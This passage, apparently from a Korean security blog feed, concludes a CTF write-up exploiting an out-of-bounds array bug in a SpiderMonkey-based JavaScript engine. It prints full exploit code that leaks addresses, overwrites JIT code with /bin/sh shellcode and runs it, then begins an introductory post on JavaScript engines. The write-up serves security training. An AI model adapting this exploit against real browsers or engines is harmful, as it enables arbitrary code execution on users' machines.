출력되었기 때문이다. 실행 결과는 다음과 같다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">JIT: 0x7f4ca84f63d8</span><br><span class="line">hi</span><br><span class="line">JIT: 0x7f4ca84f6868</span><br><span class="line">hi</span><br><span class="line">JIT: 0x7f4ca84f6868</span><br><span class="line">hi</span><br></pre></td></tr></table></figure><p>10 ~ 12 번째 반복에 JIT가 트리거되어 주소가 출력되는 걸 확인할 수 있다. 처음에 출력된 주소와 그 후에 출력된 주소가 조금 차이가 있는데 2~3번째 출력된 주소가 test 함수의 jitcode 주소이다.</p><p>math.atan을 통해 디버깅을 해보면 해당 주소에 모든 권한이 있는 걸 확인할 수 있다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JIT: 0x7ffff7ff3430</span><br><span class="line">hi</span><br><span class="line">JIT: 0x7ffff7ff3910</span><br><span class="line">hi</span><br><span class="line">JIT: 0x7ffff7ff3910</span><br><span class="line">hi</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/43925259/67089048-ad5d0180-f1e1-11e9-9589-825dfff0033a.PNG" alt="5"></p><p>익스플로잇 과정은 다음과 같다.</p><ol><li><h5 id="Create-two-arrays"><a href="#Create-two-arrays" class="headerlink" title="Create two arrays"></a>Create two arrays</h5></li><li><h5 id="OOB-trigger-First-Array"><a href="#OOB-trigger-First-Array" class="headerlink" title="OOB trigger (First Array)"></a>OOB trigger (First Array)</h5></li><li><h5 id="next-Array-addr-leak"><a href="#next-Array-addr-leak" class="headerlink" title="next Array addr leak"></a>next Array addr leak</h5></li><li><h5 id="JIT-code-address-leak"><a href="#JIT-code-address-leak" class="headerlink" title="JIT code address leak"></a>JIT code address leak</h5></li><li><h5 id="JIT-code-overwrite"><a href="#JIT-code-overwrite" class="headerlink" title="JIT code overwrite"></a>JIT code overwrite</h5></li><li><h5 id="JIT-code-execute-function-call"><a href="#JIT-code-execute-function-call" class="headerlink" title="JIT code execute (function call)"></a>JIT code execute (function call)</h5></li></ol><p>1~2번은 생략하고 3번부터 하겠다. 1~2번에 해당하는 코드는 다음과 같다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dtoi</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">f[<span class="number">0</span>] = data;</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)</span><br><span class="line">res += (<span class="string">'0'</span> + bytes[bytes.length - <span class="number">1</span> - i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parseInt</span>(res, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itod</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = [];</span><br><span class="line"><span class="keyword">var</span> hexed = (<span class="string">'0000000000000000'</span> + data.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i+=<span class="number">2</span>)</span><br><span class="line">res.push(<span class="built_in">parseInt</span>(hexed.substr(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">bytes.set(res.reverse());</span><br><span class="line"><span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'0x'</span> + data.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">b = [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">a.pop()</span><br></pre></td></tr></table></figure><p>OOB가 발생하는 Array의 다음에 다른 배열을 만들었다. 처음에 oob array를 통해 10개의 값을 출력해보니 9~10 번째에 두 번째 array의 데이터가 출력되었다.  위에서 작성했었던 결과 값을 다시 가져와보면 다음과 같다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">6.9063791040899e-310</span><br><span class="line">6.9063790999006e-310</span><br><span class="line">0</span><br><span class="line">6.9063791034334e-310</span><br><span class="line">4.243991582e-314</span><br><span class="line">4.243991583e-314</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>또한 Array 객체 분석을 할 때 캡쳐했던 화면은 다음과 같다.</p><p><img src="https://user-images.githubusercontent.com/43925259/67089051-af26c500-f1e1-11e9-9f60-362432905151.PNG" alt="6"></p><p>초록색 부분이 데이터고 빨간색 부분이 데이터의 주소라고 했었는데, 3, 4가 데이터라면 이 값이 나오기 전전전 값이 해당 데이터를 가리키는 <strong>데이터의 주소</strong>일 것이다. 즉 <code>6.9063791034334e-310</code> 이 값이 데이터의 주소일 것이고 이는 OOB Array의 인덱스에 <code>5</code>를 주면 접근할 수 있다. 이렇게 next Array addr을 쉽게 릭할 수 있다.</p><p>이 주소를 릭 하는 이유는 aaw를 트리거하기 위함이다. 이제 이 주소를 변경하고 두 번째 배열에 값을 수정함으로써 원하는 곳에 원하는 값을 쓸 수 있다. 하지만 <strong>값을 넣을땐 double 형으로 넣어야 함에 주의</strong>해야 한다. 그게 싫다면 Uin32Array를 생성해서 그 주소를 찾으면 되는데 개인적으로 이게 더 편한거 같다.</p><p>이제 jitcode 주소를 leak하면 된다. 해당 주소를 알아내기 위해 Math.atan을 이용해서 디버깅을 해보겠다. 테스트 코드는 다음과 같다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dtoi</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">f[<span class="number">0</span>] = data;</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)</span><br><span class="line">res += (<span class="string">'0'</span> + bytes[bytes.length - <span class="number">1</span> - i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parseInt</span>(res, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itod</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = [];</span><br><span class="line"><span class="keyword">var</span> hexed = (<span class="string">'0000000000000000'</span> + data.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i+=<span class="number">2</span>)</span><br><span class="line">res.push(<span class="built_in">parseInt</span>(hexed.substr(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">bytes.set(res.reverse());</span><br><span class="line"><span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'0x'</span> + data.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">print(<span class="string">'hi'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">b = [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">a.pop()</span><br><span class="line"></span><br><span class="line">next_array_addr = dtoi(a[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">get_shell();</span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.atan()</span><br></pre></td></tr></table></figure><p>math_atan에 브포를 걸고 실행해보면 위에서 설정을 해놨기 때문에 jitcode 주소가 출력이 될텐데, 해당 부분의 값을 잠깐 살펴보면 다음과 같다.</p><p><img src="https://user-images.githubusercontent.com/43925259/67089054-b057f200-f1e1-11e9-913e-8ca3b917f0a6.PNG" alt="7"></p><p>이제 이 부분에다가 셸 코드를 박을건데, 그러면 이 jitcode의 주소를 가지고 있는 곳의 위치를 구해야 하기 때문에 search 명령을 사용했다.</p><p><img src="https://user-images.githubusercontent.com/43925259/67089056-b221b580-f1e1-11e9-8048-d47480c8dbcf.PNG" alt="8"></p><p>그럼 총 3개의 값이 나온다. 앞의 2개의 값은 OOB Array 이전에 있는 값이라서 접근 조차도 못하고 세 번째 값이 우리가 원하는 값이다. 3번째 주소에 저장된 값을 보면 다음과 같다.</p><p><img src="https://user-images.githubusercontent.com/43925259/67089057-b352e280-f1e1-11e9-845a-2b7704622fef.PNG" alt="9"></p><p>여기서 첫 번째 주소가 우리가 원하는 jitcode의 주소이다. 이 주소를 leak해야 하는데, 위 사진에서 다른 주소는 다 aslr의 영향을 받아서 변하지만 <code>0x0000015000000161</code>는 변하지 않는 값이었다. 또한 <strong>search로 검색해도 하나 밖에 나오지 않는 유일한 값</strong>이다. 그러니 위 값을 가지고 index를 계속 증가시켜가면서 찾은 뒤에 인덱스를 2 빼주면 jitcode의 주소를 leak할 수 있다. 작성한 코드는 다음과 같다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jitcode_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dtoi(a[i]) == <span class="built_in">parseInt</span>(<span class="string">"0x0000015000000161"</span>, <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line">jitcode_offset = i - <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print (<span class="string">'JIT Addr: '</span> + hex(dtoi(a[jitcode_offset])))</span><br></pre></td></tr></table></figure><p>출력된 값은 우리가 소스를 수정해서 출력된 JIT 주소와 동일하다.</p><p>이제 셸 코드를 jitcode 주소에다가 박으면 된다.</p><p>먼저 OOB Array에서 Next Array의 데이터 주소를 조작하고 Next Array의 인덱스를 0, 1, 2 이렇게 올려가며 값을 쓰는 방법이 있다. 하지만 이 방법을 사용할 경우 두 가지의 단점이 존재한다.</p><ol><li>7byte밖에 컨트롤이 안된다.</li><li>배열의 요소 수를 더 늘려서 생성해야 하는데, 이 경우 조금 떨어진 곳에 할당되서 추가적으로 for 문을 돌려서 leak하는 과정을 거쳐야한다.</li></ol><p>8byte씩 값을 쓰고싶어도 소수로 들어가다보니 뭔가 문제가 있는지 7byte만 드가고 마지막은 0으로 고정이 되었으며 가장 큰 자리 숫자의 값이 어느정도 클 경우 가장 작은 자리 숫자의 값이 변해버리는 현상이 존재하였다.  근데 이 경우도 6byte 단위로 셸 코딩하면 다음과 같이 풀 수는 있긴하다.</p><p><img src="https://user-images.githubusercontent.com/43925259/67089060-b51ca600-f1e1-11e9-9bd8-a35ef167a987.PNG" alt="10"></p><p>무조건 0이 붙는걸 add나 xor을 이용해 아무 레지스터에도 영향이 없도록 bypass하고 셸 코드를 짠 모습이다. 근데 이렇게 커스텀 셸 코드를 짜기보다 기존 셸 코드를 박는 방법이 더 편해서 그 방법을 소개할려고 한다.</p><p>작성한 코드는 다음과 같다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dtoi</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">f[<span class="number">0</span>] = data;</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)</span><br><span class="line">res += (<span class="string">'0'</span> + bytes[bytes.length - <span class="number">1</span> - i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parseInt</span>(res, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itod</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bytes = <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = [];</span><br><span class="line"><span class="keyword">var</span> hexed = (<span class="string">'0000000000000000'</span> + data.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i+=<span class="number">2</span>)</span><br><span class="line">res.push(<span class="built_in">parseInt</span>(hexed.substr(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">bytes.set(res.reverse());</span><br><span class="line"><span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'0x'</span> + data.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">print(<span class="string">'hi'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">b = [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">a.pop();</span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.atan(a);</span><br><span class="line">next_array_offset = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">get_shell();</span><br><span class="line"></span><br><span class="line">jitcode_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dtoi(a[i]) == <span class="built_in">parseInt</span>(<span class="string">"0x0000015000000161"</span>, <span class="number">16</span>))</span><br><span class="line">&#123;</span><br><span class="line">jitcode_offset = i - <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print (<span class="string">'JIT Addr: '</span> + hex(dtoi(a[jitcode_offset])))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length % <span class="number">4</span>; i++)</span><br><span class="line">shellcode += <span class="string">'\x90'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; (shellcode.length / <span class="number">4</span>); i++)</span><br><span class="line">&#123;</span><br><span class="line">s = shellcode.substr(i*<span class="number">4</span>, (i*<span class="number">4</span>)+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r =  s[<span class="number">3</span>].charCodeAt() * <span class="number">0x1000000</span></span><br><span class="line">r += s[<span class="number">2</span>].charCodeAt() * <span class="number">0x10000</span></span><br><span class="line">r += s[<span class="number">1</span>].charCodeAt() * <span class="number">0x100</span></span><br><span class="line">r += s[<span class="number">0</span>].charCodeAt() * <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">a[next_array_offset] = itod(dtoi(a[jitcode_offset]) + <span class="number">4</span> * i);</span><br><span class="line">b[<span class="number">0</span>] = itod(r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure><p>shellcode를 4byte씩 나눠서 넣을건데, 먼저 길이가 4의 배수가 아니면 NOP으로 패딩을 한다. 그 후에 4byte씩 자른 후에 리틀엔디안으로 변경 후 값을 넣는 것이다.</p><hr><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><ul><li><a href="https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/?fbclid=IwAR2sPFa4HXs0NFfF7ek5XlriJPXd2-Ia1DlPDmlvPtwXhWEPKanw0Bu21LE" target="_blank" rel="noopener">https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/?fbclid=IwAR2sPFa4HXs0NFfF7ek5XlriJPXd2-Ia1DlPDmlvPtwXhWEPKanw0Bu21LE</a></li><li><a href="https://github.com/allpaca/jsExploit_CTF/blob/master/Firefox%20Exploits%20in%20CTF.pdf" target="_blank" rel="noopener">https://github.com/allpaca/jsExploit_CTF/blob/master/Firefox%20Exploits%20in%20CTF.pdf</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/2017_codegate_js_world/#disqus_thread</comments>
    </item>
    
    <item>
      <title>JS Engine 기본 개념</title>
      <link>https://defenit.kr/2019/10/15/Pwn/%E3%84%B4%20Research/JSE_%EA%B8%B0%EB%B3%B8_%EA%B0%9C%EB%85%90/</link>
      <guid>https://defenit.kr/2019/10/15/Pwn/%E3%84%B4%20Research/JSE_%EA%B8%B0%EB%B3%B8_%EA%B0%9C%EB%85%90/</guid>
      <pubDate>Mon, 14 Oct 2019 17:12:34 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;JS Engine&lt;/li&gt;
&lt;li&gt;V8&lt;/li&gt;
&lt;li&gt;SPiderMonkey&lt;/li&gt;
&lt;li&gt;Chakra Core
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h3><ul><li>JS Engine</li><li>V8</li><li>SPiderMonkey</li><li>Chakra Core</li><li>JavaScript Core</li><li>JS Engine 동작 과정</li><li>인터프리터 / 컴파일러 동작 과정<br>-&gt; V8 동작 과정<br>-&gt; SpiderMonkey 동작 과정<br>-&gt; Chakra Core 동작 과정<br>-&gt; JavaScript Core 동작 과정</li><li>JS Array<br>-&gt; Array 특징<br>-&gt; Array 함수</li><li>레퍼런스</li><li>문서 역사</li></ul><hr><h3 id="JS-Engine"><a href="#JS-Engine" class="headerlink" title="JS Engine"></a>JS Engine</h3><ul><li>자바스크립트 코드를 실행하는 프로그램 또는 인터프리터</li><li>대표적으로 <code>V8</code>, <code>SpiderMonkey</code>, <code>Chakra Core</code>, <code>JavaScript Core</code>가 있다.</li></ul><hr><h3 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h3><ul><li>C++로 작성되었으며, 구글이 개발한 오픈소스</li><li><code>Google Chrome</code>에서 사용한다.</li><li><img src="https://user-images.githubusercontent.com/43925259/66770973-e2bcd300-eef3-11e9-915c-a67e99e90863.png" alt="image"></li></ul><hr><h3 id="SpiderMonkey"><a href="#SpiderMonkey" class="headerlink" title="SpiderMonkey"></a>SpiderMonkey</h3><ul><li>최초의 자바스크립트 엔진으로, JS의 창시자가 브라우저를 위해 개발</li><li><code>FireFox</code>에서 사용</li><li><img src="https://user-images.githubusercontent.com/43925259/66771031-11d34480-eef4-11e9-96fc-491076db5add.png" alt="image"></li></ul><hr><h3 id="Chakra-Core"><a href="#Chakra-Core" class="headerlink" title="Chakra Core"></a>Chakra Core</h3><ul><li>마이크로소프트가 개발한 엔진</li><li><code>Edge</code> 브라우저에서 사용</li><li><img src="https://user-images.githubusercontent.com/43925259/66771181-7a222600-eef4-11e9-9156-d4693f3d3fa6.png" alt="image"></li></ul><hr><h3 id="JavaScript-Core"><a href="#JavaScript-Core" class="headerlink" title="JavaScript Core"></a>JavaScript Core</h3><ul><li>애플에서 WebKit 프레임워크를 위해 개발한 엔진</li><li><code>Safari</code>와 React Native App에서 사용</li><li><img src="https://user-images.githubusercontent.com/43925259/66771039-17c92580-eef4-11e9-8544-9ee9cebeb449.png" alt="image"></li></ul><hr><h3 id="JS-Engine-동작-과정"><a href="#JS-Engine-동작-과정" class="headerlink" title="JS Engine 동작 과정"></a>JS Engine 동작 과정</h3><p><img 